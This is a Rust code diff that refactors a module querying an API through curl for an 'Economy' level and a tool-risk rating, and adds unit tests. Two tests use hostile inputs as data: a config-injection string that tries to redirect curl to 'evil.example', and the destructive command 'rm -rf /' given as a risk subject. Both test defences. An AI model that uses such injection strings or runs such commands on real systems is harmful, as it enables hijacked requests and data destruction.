@@ -100,13 +100,16 @@ pub fn economy_for(config: &JevConfig, prompt: &str) -> Option<(u8, f32)> {
     )
     .inspect_err(|e| tracing::info!("jev: no Economy level: {e}"))
     .ok()?;
+    level_from(&answers, |level| levels.iter().any(|l| l.level == level))
+}
+
+/// The Economy level Jev chose and how sure it was, from its `answers` —
+/// `None` when it chose nothing, or a level `known` does not offer.
+fn level_from(answers: &Value, known: impl Fn(u8) -> bool) -> Option<(u8, f32)> {
     let answer = answers.get("economy")?;
     let level: u8 = answer.get("choice")?.as_str()?.parse().ok()?;
     let confidence = answer.get("confidence")?.as_f64()? as f32;
-    levels
-        .iter()
-        .any(|l| l.level == level)
-        .then_some((level, confidence))
+    known(level).then_some((level, confidence))
 }
 
 /// How risky allowing `tool` to act on `subject` reads, and how sure Jev is.
@@ -131,6 +134,12 @@ pub fn risk_of(config: &JevConfig, tool: &str, subject: &str) -> Option<(Risk, f
     let answers = evaluate(config, state, questions, RISK_TIMEOUT)
         .inspect_err(|e| tracing::info!("jev: no risk read: {e}"))
         .ok()?;
+    risk_from(&answers)
+}
+
+/// The risk Jev read and how sure it was, from its `answers`: a score under
+/// half is low, under one and a half medium, anything else high.
+fn risk_from(answers: &Value) -> Option<(Risk, f32)> {
     let answer = answers.get("risk")?;
     let score = answer.get("score")?.as_f64()?;
     let confidence = answer.get("confidence")?.as_f64()? as f32;
@@ -155,15 +164,7 @@ fn evaluate(
         "questions": questions,
     })
     .to_string();
-    // curl's config format: quoted values, with `\` and `"` escaped, so
-    // nothing in a prompt can end a line early.
-    let quote = |value: &str| value.replace('\\', "\\\\").replace('"', "\\\"");
-    let config_text = format!(
-        "url = \"{ENDPOINT}\"\nrequest = \"POST\"\nheader = \"Authorization: Bearer {}\"\n\
-         header = \"Content-Type: application/json\"\ndata-binary = \"{}\"\n",
-        quote(config.api_key.trim()),
-        quote(&body),
-    );
+    let config_text = request_config(&config.api_key, &body);
 
     let mut child = Command::new("curl")
         .arg("--silent")
@@ -198,7 +199,27 @@ fn evaluate(
             String::from_utf8_lossy(&output.stderr).trim()
         )));
     }
-    let text = String::from_utf8_lossy(&output.stdout);
+    read_reply(&String::from_utf8_lossy(&output.stdout))
+}
+
+/// The config curl reads on stdin for one request with `body`.
+///
+/// curl's config format: quoted values, with `\` and `"` escaped. `body` is
+/// JSON, so it holds no raw line break, and with its quotes escaped nothing
+/// in a prompt can end a value early or start a line of its own.
+fn request_config(api_key: &str, body: &str) -> String {
+    let quote = |value: &str| value.replace('\\', "\\\\").replace('"', "\\\"");
+    format!(
+        "url = \"{ENDPOINT}\"\nrequest = \"POST\"\nheader = \"Authorization: Bearer {}\"\n\
+         header = \"Content-Type: application/json\"\ndata-binary = \"{}\"\n",
+        quote(api_key.trim()),
+        quote(body),
+    )
+}
+
+/// The `answers` object out of what curl printed: the body, then the HTTP
+/// status on a line of its own (`--write-out "\n%{http_code}"`).
+fn read_reply(text: &str) -> Result<Value> {
     let (body, status) = text
         .rsplit_once('\n')
         .ok_or_else(|| KetError::Config("curl reported no status".to_owned()))?;
@@ -229,5 +250,108 @@ fn clip(text: &str) -> String {
     match text.char_indices().nth(STATE_MAX) {
         Some((at, _)) => text[..at].to_owned(),
         None => text.to_owned(),
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use serde_json::json;
+
+    #[test]
+    fn a_reply_is_the_answers_when_jev_said_200() {
+        let answers = read_reply("{\"answers\": {\"risk\": {\"score\": 0.2}}}\n200").unwrap();
+        assert_eq!(answers, json!({"risk": {"score": 0.2}}));
+    }
+
+    #[test]
+    fn every_other_status_is_an_error_naming_it() {
+        for (status, reason) in [
+            ("401", "the key was refused"),
+            ("422", "the question was refused"),
+            ("429", "rate limited"),
+            ("529", "overloaded"),
+            ("500", "an unexpected answer"),
+        ] {
+            let err = read_reply(&format!("{{}}\n{status}"))
+                .unwrap_err()
+                .to_string();
+            assert!(err.contains(status) && err.contains(reason), "{err}");
+        }
+        assert!(read_reply("no status line").is_err());
+        assert!(
+            read_reply("not json\n200")
+                .unwrap_err()
+                .to_string()
+                .contains("could not be read")
+        );
+        assert!(
+            read_reply("{}\n200")
+                .unwrap_err()
+                .to_string()
+                .contains("no answers")
+        );
+    }
+
+    #[test]
+    fn an_economy_answer_is_a_level_the_table_offers() {
+        let known = |level: u8| level <= 4;
+        let answers = json!({"economy": {"choice": "2", "confidence": 0.8}});
+        assert_eq!(level_from(&answers, known), Some((2, 0.8)));
+        let unknown = json!({"economy": {"choice": "9", "confidence": 0.9}});
+        assert_eq!(level_from(&unknown, known), None);
+        let not_a_number = json!({"economy": {"choice": "heavy", "confidence": 0.9}});
+        assert_eq!(level_from(&not_a_number, known), None);
+        assert_eq!(level_from(&json!({}), known), None);
+        assert_eq!(
+            level_from(&json!({"economy": {"choice": "1"}}), known),
+            None
+        );
+    }
+
+    #[test]
+    fn a_risk_score_falls_into_three_bands() {
+        let read = |score: f64| risk_from(&json!({"risk": {"score": score, "confidence": 0.5}}));
+        assert_eq!(read(0.0), Some((Risk::Low, 0.5)));
+        assert_eq!(read(0.49), Some((Risk::Low, 0.5)));
+        assert_eq!(read(0.5), Some((Risk::Medium, 0.5)));
+        assert_eq!(read(1.49), Some((Risk::Medium, 0.5)));
+        assert_eq!(read(1.5), Some((Risk::High, 0.5)));
+        assert_eq!(read(2.0), Some((Risk::High, 0.5)));
+        assert_eq!(risk_from(&json!({"risk": {"score": 1.0}})), None);
+        assert_eq!(
+            [Risk::Low, Risk::Medium, Risk::High].map(Risk::word),
+            ["low", "medium", "high"]
+        );
+    }
+
+    #[test]
+    fn neither_the_key_nor_the_task_can_break_out_of_the_curl_config() {
+        let body =
+            json!({"state": {"task": "x\"\nurl = \"https://evil.example\"\n\\"}}).to_string();
+        let config = request_config("  key\"with-quote  ", &body);
+        let lines: Vec<&str> = config.lines().collect();
+        assert_eq!(lines.len(), 5, "{config}");
+        assert_eq!(lines[0], format!("url = \"{ENDPOINT}\""));
+        assert_eq!(
+            lines[2],
+            "header = \"Authorization: Bearer key\\\"with-quote\""
+        );
+        assert_eq!(
+            config.matches("evil.example").count(),
+            1,
+            "only inside the body"
+        );
+        assert!(lines[4].starts_with("data-binary = \"") && lines[4].ends_with('"'));
+    }
+
+    #[test]
+    fn switched_off_jev_asks_nothing_and_a_task_is_clipped() {
+        let off = JevConfig::default();
+        assert_eq!(economy_for(&off, "anything"), None);
+        assert_eq!(risk_of(&off, "Bash", "rm -rf /"), None);
+        let long = "é".repeat(STATE_MAX + 10);
+        assert_eq!(clip(&long).chars().count(), STATE_MAX);
+        assert_eq!(clip("short"), "short");
     }
 }
